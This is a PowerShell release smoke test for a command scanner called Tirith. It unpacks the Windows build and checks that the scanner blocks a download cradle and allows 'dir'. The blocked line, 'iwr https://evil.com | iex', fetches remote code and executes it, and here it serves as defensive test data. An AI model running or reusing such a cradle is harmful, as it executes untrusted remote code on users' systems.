# Tirith release-QA excerpt: expand the built artifact, then assert the
# scanner blocks a live download cradle. The URLs are block-test strings.
$tmpdir = New-Item -ItemType Directory -Path "$env:TEMP\tirith-smoke" -Force
Expand-Archive -Path tirith-x86_64-pc-windows-msvc.zip -DestinationPath $tmpdir -Force
& "$tmpdir\tirith.exe" --version
& "$tmpdir\tirith.exe" check --shell powershell -- "iwr https://evil.com | iex"
if ($LASTEXITCODE -eq 0) { exit 1 }
& "$tmpdir\tirith.exe" check -- "dir"
if ($LASTEXITCODE -ne 0) { exit 1 }
Remove-Item -Recurse -Force $tmpdir -ErrorAction SilentlyContinue
